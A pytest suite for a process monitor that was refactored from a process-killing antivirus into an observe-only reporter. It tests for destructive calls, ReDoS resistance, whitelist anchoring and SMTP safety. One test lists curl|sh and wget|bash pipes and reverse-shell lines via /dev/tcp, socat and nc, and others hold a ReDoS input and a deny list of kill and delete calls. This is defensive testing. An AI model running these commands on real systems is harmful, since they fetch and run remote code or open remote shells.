"""
Safety tests for the process monitor.

The monitor used to be an antivirus: it matched a substring against a process
command line and, from a systemd unit running as root, terminated the process
tree and passed the process working directory to ``shutil.rmtree``. A process
with ``cwd=/tmp`` meant deleting ``/tmp``.

These tests pin the decision that replaced it: the monitor observes and
reports, it never acts. Anything that would kill a process or delete a file is
a regression, so the guard test reads the package source rather than any single
code path.
"""

from __future__ import annotations

import ast
import os
import shutil
import smtplib
import tempfile
import time
import types
from pathlib import Path
from typing import Any, ClassVar

import psutil
import pytest

MONITOR_PACKAGE = Path(__file__).resolve().parents[1] / "src" / "wasm" / "monitor"

#: Calls that destroy processes or files. None of them belong in a monitor.
DESTRUCTIVE_CALLS = frozenset(
    {
        "rmtree",
        "unlink",
        "remove",
        "rmdir",
        "removedirs",
        "kill",
        "killpg",
        "terminate",
        "send_signal",
    }
)


class _FakeProcess:
    """Stand-in for ``psutil.Process`` as returned by ``process_iter``."""

    def __init__(self, **info: Any) -> None:
        self.info = info
        self.pid = info["pid"]

    def name(self) -> str:
        return self.info["name"]

    def net_connections(self, kind: str = "inet") -> list[Any]:
        return []

    def open_files(self) -> list[Any]:
        return []

    def children(self, recursive: bool = False) -> list[Any]:
        return []


class _RecordingStore:
    """Captures whatever the monitor decides to persist."""

    def __init__(self) -> None:
        self.saved: list[Any] = []

    def save_many(self, items: list[Any]) -> list[int]:
        self.saved.extend(items)
        return list(range(len(items)))

    # The pre-refactor name, so the same test drives both implementations.
    def save_threats(self, items: list[Any]) -> list[int]:
        return self.save_many(items)

    def purge_older_than(self, days: int) -> int:
        return 0


class _RecordingNotifier:
    """Swallows notifications instead of opening an SMTP connection."""

    def __init__(self) -> None:
        self.sent: list[Any] = []

    def send_observation_alert(self, observations: list[Any]) -> bool:
        self.sent.append(observations)
        return True

    # The pre-refactor name.
    def send_threat_alert(self, reports: list[Any], is_final: bool = False) -> bool:
        return self.send_observation_alert(reports)


def _make_process(**overrides: Any) -> _FakeProcess:
    """
    Build a fake psutil process, defaulting to a plausible miner.

    Args:
        overrides: Fields to replace in the default info dictionary.

    Returns:
        A fake process object accepted by the monitor's collection code.
    """
    info: dict[str, Any] = {
        "pid": 424242,
        "name": "xmrig",
        "username": "nobody",
        "cpu_percent": 99.0,
        "memory_percent": 12.0,
        "cmdline": ["./xmrig", "--donate-level", "1"],
        "create_time": 0.0,
        # A zero ppid keeps the collector from looking up a real parent.
        "ppid": 0,
        "status": "running",
        "num_threads": 4,
        "cwd": "/var/empty",
    }
    info.update(overrides)
    return _FakeProcess(**info)


def _install_processes(monkeypatch: pytest.MonkeyPatch, processes: list[_FakeProcess]) -> None:
    """
    Make ``psutil.process_iter`` yield the given fakes.

    Args:
        monkeypatch: Patching helper, scoped to the test.
        processes: Fake processes to expose.
    """
    monkeypatch.setattr(
        psutil,
        "process_iter",
        lambda attrs=None, *args, **kwargs: iter(list(processes)),
    )


def _build_monitor(store: _RecordingStore, notifier: _RecordingNotifier) -> Any:
    """
    Build a ProcessMonitor with its persistence and notification stubbed.

    Args:
        store: Stub observation store.
        notifier: Stub notifier.

    Returns:
        The monitor instance.
    """
    from wasm.monitor.process_monitor import MonitorConfig, ProcessMonitor

    try:
        return ProcessMonitor(config=MonitorConfig(), store=store, notifier=notifier)
    except TypeError:
        # The pre-refactor constructor allowed no injection; reach in instead so
        # the test can still exercise the vulnerable code path.
        monitor = ProcessMonitor(config=MonitorConfig())
        monitor.threat_store = store
        monitor.notifier = notifier
        if hasattr(monitor, "analyzer"):
            monitor.analyzer.api_key = ""
        return monitor


@pytest.fixture
def process_workdir() -> Path:
    """
    A directory under the real system temp dir, standing in for a process cwd.

    Returns:
        Path to the directory, removed when the test ends.
    """
    if not Path("/tmp").is_dir():
        pytest.skip("no /tmp on this system")
    path = Path(tempfile.mkdtemp(prefix="wasm-monitor-test-", dir="/tmp"))
    (path / "important.txt").write_text("do not delete me")
    try:
        yield path
    finally:
        shutil.rmtree(path, ignore_errors=True)


def test_scan_never_deletes_the_working_directory_of_a_flagged_process(
    monkeypatch: pytest.MonkeyPatch,
    process_workdir: Path,
) -> None:
    """A process whose cwd is under /tmp must not cost anyone that directory."""
    signals_sent: list[tuple[int, int]] = []
    monkeypatch.setattr(os, "kill", lambda pid, sig: signals_sent.append((pid, sig)))
    _install_processes(monkeypatch, [_make_process(cwd=str(process_workdir))])

    store = _RecordingStore()
    monitor = _build_monitor(store, _RecordingNotifier())

    # Pre-refactor the scan also hunted for persistence with a real subprocess,
    # which the suite blocks; that happened after the deletion, so the failure
    # is recorded and the filesystem assertions still run.
    failure: BaseException | None = None
    try:
        monitor.scan_once()
    except BaseException as exc:
        failure = exc

    assert process_workdir.is_dir(), (
        f"monitor deleted the working directory of the flagged process ({failure!r})"
    )
    assert (process_workdir / "important.txt").read_text() == "do not delete me"
    assert signals_sent == [], "monitor signalled a process instead of only reporting it"
    assert failure is None, f"scan raised {failure!r}"


def test_scan_records_the_flagged_process_as_an_observation(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Detection stays, as a signal a human can read, not as an action."""
    _install_processes(monkeypatch, [_make_process()])

    store = _RecordingStore()
    monitor = _build_monitor(store, _RecordingNotifier())

    observations = monitor.scan_once()

    assert len(observations) == 1
    observation = observations[0]
    assert observation.process.pid == 424242
    assert observation.process.name == "xmrig"
    assert observation.signal == "name-pattern"
    assert "xmrig" in observation.detail
    assert store.saved == observations


def test_known_safe_process_is_not_flagged_by_its_command_line(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Reading a miner's name is not being a miner: grep must stay unflagged."""
    _install_processes(
        monkeypatch,
        [
            _make_process(
                pid=17,
                name="grep",
                cpu_percent=1.0,
                memory_percent=0.5,
                cmdline=["grep", "-r", "xmrig", "/var/log"],
            )
        ],
    )

    monitor = _build_monitor(_RecordingStore(), _RecordingNotifier())

    assert monitor.scan_once() == []


def test_observations_survive_a_round_trip_through_the_store(tmp_path: Path) -> None:
    """The persistence layer keeps the signal, not a verdict about it."""
    from wasm.monitor.models import ProcessInfo, ProcessObservation
    from wasm.monitor.observation_store import ObservationStore

    store = ObservationStore(db_path=tmp_path / "observations.db")
    observation = ProcessObservation(
        process=ProcessInfo(pid=99, name="xmrig", user="nobody", cpu_percent=97.5),
        signal="name-pattern",
        severity="warning",
        detail="Executable name matches the known-malware pattern 'xmrig'.",
    )

    (row_id,) = store.save_many([observation])
    stored = store.get(row_id)

    assert stored is not None
    assert stored["process_name"] == "xmrig"
    assert stored["severity"] == "warning"
    assert stored["acknowledged"] == 0
    assert "action_taken" not in stored, "the store still speaks in terms of actions taken"

    assert [r["id"] for r in store.recent()] == [row_id]
    assert store.acknowledge(row_id) is True
    assert store.recent() == []
    assert store.stats() == {
        "total": 1,
        "warning": 1,
        "notice": 0,
        "acknowledged": 1,
        "open": 0,
    }


def _iter_monitor_sources() -> list[Path]:
    """
    List the Python sources of the monitor package.

    Returns:
        Every ``.py`` file shipped in ``wasm.monitor``.
    """
    return sorted(p for p in MONITOR_PACKAGE.rglob("*.py") if "__pycache__" not in p.parts)


def test_monitor_package_contains_no_destructive_calls() -> None:
    """No kill, no rmtree, no unlink anywhere in the package."""
    sources = _iter_monitor_sources()
    assert sources, f"no sources found under {MONITOR_PACKAGE}"

    offences: list[str] = []
    for path in sources:
        tree = ast.parse(path.read_text(), filename=str(path))
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            func = node.func
            if isinstance(func, ast.Attribute):
                called = func.attr
            elif isinstance(func, ast.Name):
                called = func.id
            else:
                continue
            if called in DESTRUCTIVE_CALLS:
                offences.append(f"{path.name}:{node.lineno} calls {called}()")

    assert offences == [], "destructive calls in the monitor package: " + "; ".join(offences)


def test_monitor_package_does_not_import_shutil_or_signal() -> None:
    """The imports that only served termination and cleanup are gone too."""
    forbidden = {"shutil", "signal"}
    offences: list[str] = []
    for path in _iter_monitor_sources():
        tree = ast.parse(path.read_text(), filename=str(path))
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                names = {alias.name.split(".")[0] for alias in node.names}
            elif isinstance(node, ast.ImportFrom):
                names = {(node.module or "").split(".")[0]}
            else:
                continue
            for name in sorted(names & forbidden):
                offences.append(f"{path.name}:{node.lineno} imports {name}")

    assert offences == [], "termination-era imports still present: " + "; ".join(offences)


def test_monitor_package_does_not_call_third_party_apis() -> None:
    """Process data from a customer server never leaves the box."""
    offences: list[str] = []
    for path in _iter_monitor_sources():
        source = path.read_text()
        for needle in ("httpx", "openai", "api.openai.com", "requests."):
            if needle in source:
                offences.append(f"{path.name} mentions {needle}")

    assert offences == [], "outbound analysis leftovers: " + "; ".join(offences)


def _install_psutil_metrics(monkeypatch: pytest.MonkeyPatch) -> None:
    """
    Replace every psutil call the metric collector makes with fixed values.

    Args:
        monkeypatch: Patching helper, scoped to the test.
    """
    monkeypatch.setattr(psutil, "cpu_percent", lambda interval=None: 12.5)
    monkeypatch.setattr(psutil, "cpu_count", lambda logical=True: 4)
    monkeypatch.setattr(psutil, "getloadavg", lambda: (0.5, 0.4, 0.3))
    monkeypatch.setattr(
        psutil,
        "virtual_memory",
        lambda: types.SimpleNamespace(total=8_000, used=2_000, available=6_000, percent=25.0),
    )
    monkeypatch.setattr(
        psutil,
        "swap_memory",
        lambda: types.SimpleNamespace(total=1_000, used=100, percent=10.0),
    )
    monkeypatch.setattr(
        psutil,
        "disk_partitions",
        lambda all=False: [
            types.SimpleNamespace(device="/dev/sda1", mountpoint="/", fstype="ext4", opts="rw"),
            types.SimpleNamespace(device="proc", mountpoint="/proc", fstype="proc", opts="rw"),
        ],
    )
    monkeypatch.setattr(
        psutil,
        "disk_usage",
        lambda path: types.SimpleNamespace(total=100_000, used=40_000, free=60_000, percent=40.0),
    )
    monkeypatch.setattr(
        psutil,
        "net_io_counters",
        lambda: types.SimpleNamespace(
            bytes_sent=1_111,
            bytes_recv=2_222,
            packets_sent=11,
            packets_recv=22,
        ),
    )
    monkeypatch.setattr(psutil, "boot_time", lambda: 1_000.0)
    monkeypatch.setattr(psutil, "pids", lambda: [1, 2, 3])


def test_collect_resource_metrics_reads_cpu_memory_disk_and_network(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The part of the monitor that actually earns its keep."""
    from wasm.monitor.metrics import collect_resource_metrics

    _install_psutil_metrics(monkeypatch)
    monkeypatch.setattr("time.time", lambda: 4_600.0)

    metrics = collect_resource_metrics()

    assert metrics.cpu_percent == 12.5
    assert metrics.cpu_count == 4
    assert metrics.load_average == (0.5, 0.4, 0.3)
    assert metrics.memory_total_bytes == 8_000
    assert metrics.memory_used_bytes == 2_000
    assert metrics.memory_percent == 25.0
    assert metrics.swap_percent == 10.0
    assert metrics.net_bytes_sent == 1_111
    assert metrics.net_bytes_recv == 2_222
    assert metrics.process_count == 3
    assert metrics.uptime_seconds == 3_600.0

    # Pseudo filesystems carry no capacity worth reporting.
    assert [d.mountpoint for d in metrics.disks] == ["/"]
    assert metrics.disks[0].percent == 40.0
    assert metrics.disks[0].used_bytes == 40_000


def test_collect_resource_metrics_survives_an_unreadable_mountpoint(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A CD-ROM slot that raises must not take the whole scan down."""
    from wasm.monitor.metrics import collect_resource_metrics

    _install_psutil_metrics(monkeypatch)

    def _explode(path: str) -> Any:
        raise PermissionError(path)

    monkeypatch.setattr(psutil, "disk_usage", _explode)

    metrics = collect_resource_metrics()

    assert metrics.disks == ()
    assert metrics.cpu_percent == 12.5


def test_list_processes_maps_psutil_fields(monkeypatch: pytest.MonkeyPatch) -> None:
    """Process collection keeps the fields an operator needs to identify one."""
    from wasm.monitor.metrics import list_processes

    _install_processes(
        monkeypatch,
        [
            _make_process(pid=1, name="systemd", cmdline=["/sbin/init"], cpu_percent=0.1),
            _make_process(pid=2, name="node", cmdline=["node", "server.js"], ppid=1),
        ],
    )

    processes = list_processes()

    assert [p.pid for p in processes] == [1, 2]
    assert processes[1].command == "node server.js"
    assert processes[1].parent_pid == 1
    assert processes[1].parent_name == "systemd"
    assert processes[0].user == "nobody"


def test_installing_the_unit_writes_a_file_and_reloads_through_the_runner(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
    runner: Any,
) -> None:
    """systemd is driven through the audited seam, with an absolute ExecStart."""
    from wasm.monitor import process_monitor as module

    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    wasm_bin = bin_dir / "wasm"
    wasm_bin.write_text("#!/bin/sh\n")
    wasm_bin.chmod(0o755)
    monkeypatch.setenv("PATH", str(bin_dir))
    monkeypatch.setattr(module, "SYSTEMD_DIR", tmp_path / "systemd")

    monitor = module.ProcessMonitor(config=module.MonitorConfig(), runner=runner)

    assert monitor.install_service() is True

    unit = monitor.unit_path.read_text()
    assert f"ExecStart={wasm_bin} monitor run" in unit
    assert "NoNewPrivileges=true" in unit
    assert ("systemctl", "daemon-reload") in runner.calls


def test_service_health_uses_the_command_runner(runner: Any) -> None:
    """Service checks go through the audited seam, never bare subprocess."""
    from wasm.monitor.metrics import collect_service_health

    runner.script(["systemctl", "is-active"], stdout="active\n")
    runner.script(["systemctl", "is-enabled"], stdout="enabled\n")

    health = collect_service_health(["wasm-example-com"], runner=runner)

    assert len(health) == 1
    assert health[0].unit == "wasm-example-com"
    assert health[0].active is True
    assert health[0].enabled is True
    assert ("systemctl", "is-active", "wasm-example-com") in runner.calls


class _FakeSMTP:
    """Records the arguments the notifier hands to smtplib."""

    instances: ClassVar[list[_FakeSMTP]] = []

    def __init__(self, host: str = "", port: int = 0, **kwargs: Any) -> None:
        self.host = host
        self.port = port
        self.kwargs = kwargs
        self.logged_in: tuple[str, str] | None = None
        self.started_tls = False
        self.sent: list[tuple[str, list[str], str]] = []
        _FakeSMTP.instances.append(self)

    def starttls(self, context: Any = None) -> None:
        self.started_tls = True

    def login(self, username: str, password: str) -> None:
        self.logged_in = (username, password)

    def sendmail(self, sender: str, recipients: list[str], message: str) -> None:
        self.sent.append((sender, recipients, message))

    def quit(self) -> None:
        pass


@pytest.fixture
def fake_smtp(monkeypatch: pytest.MonkeyPatch) -> type[_FakeSMTP]:
    """
    Replace both smtplib entry points with a recording double.

    Returns:
        The double class, whose ``instances`` list holds every connection.
    """
    _FakeSMTP.instances = []
    monkeypatch.setattr(smtplib, "SMTP_SSL", _FakeSMTP)
    monkeypatch.setattr(smtplib, "SMTP", _FakeSMTP)
    return _FakeSMTP


def _notifier(**overrides: Any) -> Any:
    """
    Build an EmailNotifier with explicit SMTP settings.

    Args:
        overrides: Fields to replace in the default SMTP configuration.

    Returns:
        The notifier instance.
    """
    from wasm.monitor.email_notifier import EmailNotifier, SMTPConfig

    settings: dict[str, Any] = {
        "host": "smtp.example.com",
        "port": 465,
        "username": "alerts@example.com",
        "password": "hunter2-do-not-log",
        "use_ssl": True,
    }
    settings.update(overrides)
    return EmailNotifier(smtp_config=SMTPConfig(**settings), recipients=["ops@example.com"])


def test_smtp_connection_always_carries_a_timeout(fake_smtp: type[_FakeSMTP]) -> None:
    """A monitor loop with one thread cannot afford an SMTP socket with no deadline."""
    _notifier()._create_connection()

    assert len(fake_smtp.instances) == 1
    timeout = fake_smtp.instances[0].kwargs.get("timeout")
    assert timeout is not None, "SMTP connection opened without a timeout"
    assert 0 < timeout <= 120


def test_starttls_is_used_when_ssl_is_off(fake_smtp: type[_FakeSMTP]) -> None:
    """Credentials never travel over a plaintext session."""
    _notifier(use_ssl=False, use_tls=True, port=587)._create_connection()

    connection = fake_smtp.instances[0]
    assert connection.started_tls is True
    assert connection.kwargs.get("timeout") is not None


def test_plaintext_login_is_refused(fake_smtp: type[_FakeSMTP]) -> None:
    """Sending a password in the clear is a configuration error, not a default."""
    from wasm.core.exceptions import EmailError

    with pytest.raises(EmailError) as excinfo:
        _notifier(use_ssl=False, use_tls=False, port=25)._create_connection()

    assert fake_smtp.instances == []
    assert "hunter2-do-not-log" not in str(excinfo.value)
    assert "hunter2-do-not-log" not in str(getattr(excinfo.value, "details", ""))


def test_non_positive_timeout_is_rejected() -> None:
    """A zero timeout is the hang this test exists to prevent."""
    from wasm.core.exceptions import EmailError
    from wasm.monitor.email_notifier import SMTPConfig

    with pytest.raises(EmailError):
        SMTPConfig(host="smtp.example.com", port=465, username="u", password="p", timeout=0)


def test_smtp_failure_does_not_leak_the_password(
    monkeypatch: pytest.MonkeyPatch,
    fake_smtp: type[_FakeSMTP],
) -> None:
    """Whatever the server says back, the password stays out of the message."""
    from wasm.core.exceptions import EmailError

    def _fail(self: Any, username: str, password: str) -> None:
        raise smtplib.SMTPAuthenticationError(535, f"rejected {password}".encode())

    monkeypatch.setattr(_FakeSMTP, "login", _fail)

    with pytest.raises(EmailError) as excinfo:
        _notifier()._create_connection()

    rendered = f"{excinfo.value} {getattr(excinfo.value, 'details', '')}"
    assert "hunter2-do-not-log" not in rendered


# ---------------------------------------------------------------------------
# Cost of classification
#
# The daemon runs as root, in one thread, over every process on the machine.
# Any unprivileged user can choose the contents of their own argv, so anything
# the classifier does with a command line is an input the attacker controls.
# The previous version matched ``curl\s[^|]*\|\s*(ba)?sh`` against it: quadratic
# backtracking, driven by a hostile string, inside the scan loop.
# ---------------------------------------------------------------------------

#: A command line no legitimate program produces, and any user can.
HOSTILE_COMMAND = "curl " * 20_000

#: Budget for classifying one process. The daemon classifies thousands.
CLASSIFY_BUDGET_SECONDS = 0.1


def _process_info(**overrides: Any) -> Any:
    """
    Build a ProcessInfo with sensible defaults.

    Args:
        overrides: Fields to replace.

    Returns:
        The process snapshot.
    """
    from wasm.monitor.models import ProcessInfo

    fields: dict[str, Any] = {
        "pid": 4242,
        "name": "payload",
        "user": "nobody",
        "cpu_percent": 1.0,
        "memory_percent": 1.0,
        "command": "payload",
    }
    fields.update(overrides)
    return ProcessInfo(**fields)


def test_classifying_a_hostile_command_line_is_fast() -> None:
    """A 100 KB argv chosen by a local user must not stall the root daemon."""
    from wasm.monitor.signals import observe_process

    process = _process_info(command=HOSTILE_COMMAND)

    started = time.perf_counter()
    observe_process(process, cpu_threshold=80.0, memory_threshold=80.0)
    elapsed = time.perf_counter() - started

    assert elapsed < CLASSIFY_BUDGET_SECONDS, (
        f"classifying one process took {elapsed:.3f}s; a scan sees thousands"
    )


def test_classifying_a_whole_hostile_process_table_is_fast() -> None:
    """The cost has to stay linear across the table, not just per process."""
    from wasm.monitor.signals import observe_processes

    processes = [_process_info(pid=i, command=HOSTILE_COMMAND) for i in range(50)]

    started = time.perf_counter()
    observe_processes(processes, cpu_threshold=80.0, memory_threshold=80.0)
    elapsed = time.perf_counter() - started

    assert elapsed < 1.0, f"scanning 50 hostile processes took {elapsed:.3f}s"


def test_command_line_content_alone_never_produces_an_observation() -> None:
    """
    What a process reads, downloads or greps for is not evidence about it.

    Dropping the command-line patterns is the decision that removes the whole
    "the cmdline drives the monitor" class, ReDoS included.
    """
    from wasm.monitor.signals import observe_process

    for command in (
        "curl https://example.com/install.sh | sh",
        "wget -qO- https://example.com/x | bash",
        "bash -c 'exec 3<>/dev/tcp/10.0.0.1/4444'",
        "socat tcp:10.0.0.1:9 exec:/bin/sh",
        "nc -e /bin/sh 10.0.0.1 4444",
    ):
        observation = observe_process(
            _process_info(command=command),
            cpu_threshold=80.0,
            memory_threshold=80.0,
        )
        assert observation is None, f"command line alone produced an observation: {command}"


def test_signals_module_uses_no_regular_expressions() -> None:
    """
    No regex, no backtracking. The rule is enforced on the source.

    A future pattern would reintroduce the risk quietly; this makes it loud.
    """
    source = (MONITOR_PACKAGE / "signals.py").read_text()
    tree = ast.parse(source, filename="signals.py")

    imports = {
        alias.name.split(".")[0]
        for node in ast.walk(tree)
        if isinstance(node, ast.Import)
        for alias in node.names
    } | {
        (node.module or "").split(".")[0]
        for node in ast.walk(tree)
        if isinstance(node, ast.ImportFrom)
    }

    assert "re" not in imports, "signals.py imports re again; matching must stay linear"


# ---------------------------------------------------------------------------
# Whitelist anchoring
# ---------------------------------------------------------------------------


def test_an_impostor_named_after_a_system_daemon_is_not_known_safe() -> None:
    """``^systemd`` as a prefix match makes 'systemd-xmrig' a trusted process."""
    from wasm.monitor.signals import is_known_safe

    for name in (
        "systemd-xmrig",
        "systemdd",
        "postgres-miner",
        "dbus-kinsing",
        "nginxx",
        "containerd-evil",
        "php-fpm-backdoor",
        "python3-xmrig",
        "wasm-miner",
    ):
        assert is_known_safe(_process_info(name=name)) is False, f"{name} passed as known safe"


def test_real_system_daemons_are_still_known_safe() -> None:
    """Anchoring must not turn the whitelist into dead code."""
    from wasm.monitor.signals import is_known_safe

    for name in (
        "systemd",
        "systemd-journald",
        "sshd",
        "nginx",
        "postgres",
        "mysqld",
        "node",
        "python3",
        "python3.11",
        "php-fpm8.2",
        "dbus-daemon",
        "wasm",
    ):
        assert is_known_safe(_process_info(name=name)) is True, f"{name} lost its whitelist entry"


def test_an_impostor_is_still_reported_when_it_burns_the_machine() -> None:
    """Failing the whitelist means the resource signal applies to it."""
    from wasm.monitor.signals import observe_process

    observation = observe_process(
        _process_info(name="systemd-xmrig", cpu_percent=99.0),
        cpu_threshold=80.0,
        memory_threshold=80.0,
    )

    assert observation is not None
    assert observation.signal == "resource-usage"


# ---------------------------------------------------------------------------
# What the store keeps, and for how long
# ---------------------------------------------------------------------------


def _observation(pid: int, name: str = "xmrig", signal: str = "name-pattern") -> Any:
    """
    Build an observation for the store tests.

    Args:
        pid: Process identifier to record.
        name: Executable name to record.
        signal: Which check produced it.

    Returns:
        The observation.
    """
    from wasm.monitor.models import ProcessObservation

    return ProcessObservation(
        process=_process_info(pid=pid, name=name),
        signal=signal,
        severity="warning",
        detail="detail",
    )


def test_the_store_keeps_a_bounded_number_of_observations(tmp_path: Path) -> None:
    """A daemon scanning every minute forever must not fill the disk."""
    from wasm.monitor.observation_store import ObservationStore

    store = ObservationStore(db_path=tmp_path / "observations.db", max_observations=100)

    for pid in range(500):
        store.save_many([_observation(pid=pid)])

    assert store.stats()["total"] <= 100
    newest = store.recent(limit=1)
    assert newest and newest[0]["pid"] == 499, (
        "the cap dropped the newest rows instead of the oldest"
    )


def test_the_store_does_not_rewrite_the_same_observation_every_scan(tmp_path: Path) -> None:
    """One noisy process for an hour is one row, not sixty."""
    from wasm.monitor.observation_store import ObservationStore

    store = ObservationStore(db_path=tmp_path / "observations.db")

    for _ in range(60):
        store.save_many([_observation(pid=1234)])

    assert store.stats()["total"] == 1


def test_the_store_purges_observations_past_the_retention_window(tmp_path: Path) -> None:
    """Retention is enforced by deleting, not by hoping."""
    from wasm.monitor.observation_store import ObservationStore

    store = ObservationStore(db_path=tmp_path / "observations.db")
    (row_id,) = store.save_many([_observation(pid=7)])

    connection = store._get_connection()
    with connection:
        connection.execute(
            "UPDATE observations SET observed_at = datetime('now', '-40 days') WHERE id = ?",
            (row_id,),
        )

    assert store.purge_older_than(30) == 1
    assert store.stats()["total"] == 0


def test_a_hostile_command_line_is_truncated_before_it_is_stored(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """100 KB of argv per process, once a minute, is a database, not a log."""
    from wasm.monitor.metrics import MAX_COMMAND_LENGTH, list_processes

    _install_processes(
        monkeypatch,
        [_make_process(pid=5, name="payload", cmdline=["curl"] * 20_000)],
    )

    (process,) = list_processes()

    assert len(process.command) <= MAX_COMMAND_LENGTH


def test_disk_reporting_skips_read_only_and_repeated_mounts(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """
    A capacity report is about filesystems an operator can fill.

    Snaps are squashfs images pinned at 100%, and container bind mounts repeat
    the same device dozens of times; both turn the report into noise and cost a
    statvfs each, on every scan.
    """
    from wasm.monitor.metrics import collect_resource_metrics

    _install_psutil_metrics(monkeypatch)
    monkeypatch.setattr(
        psutil,
        "disk_partitions",
        lambda all=False: [
            types.SimpleNamespace(device="/dev/sda1", mountpoint="/", fstype="ext4", opts="rw"),
            types.SimpleNamespace(
                device="/dev/sda1", mountpoint="/var/lib/docker/x", fstype="ext4", opts="rw"
            ),
            types.SimpleNamespace(
                device="/dev/loop3", mountpoint="/snap/core", fstype="squashfs", opts="ro,nodev"
            ),
        ],
    )

    metrics = collect_resource_metrics()

    assert [d.mountpoint for d in metrics.disks] == ["/"]


def test_a_process_that_keeps_misbehaving_is_reported_once_per_window(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    """
    Repetition is not news.

    With a real store behind it, a scan every minute over a process that stays
    over the threshold writes one row and sends one email per deduplication
    window, not one of each per scan.
    """
    from wasm.monitor.observation_store import ObservationStore
    from wasm.monitor.process_monitor import MonitorConfig, ProcessMonitor

    _install_processes(monkeypatch, [_make_process()])
    store = ObservationStore(db_path=tmp_path / "observations.db")
    notifier = _RecordingNotifier()
    monitor = ProcessMonitor(
        config=MonitorConfig(notify=True),
        store=store,
        notifier=notifier,
    )

    for _ in range(5):
        assert len(monitor.scan_once()) == 1

    assert store.stats()["total"] == 1
    assert len(notifier.sent) == 1, "the same process was mailed about on every scan"
